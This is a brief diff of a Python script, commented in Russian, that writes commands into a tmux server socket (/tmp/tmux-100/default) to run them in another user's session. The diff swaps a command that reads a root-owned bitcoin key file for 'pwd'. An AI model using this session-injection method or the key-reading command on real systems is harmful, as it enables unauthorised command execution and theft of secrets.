@@ -9,7 +9,7 @@ try:
     s.connect("/tmp/tmux-100/default")
 
     # Отправка команды в сокет
-    command = "cat /root/bitcoin_key.txt\n"
+    command = "pwd\n"
     s.sendall(command.encode())
 
     # Получение ответа
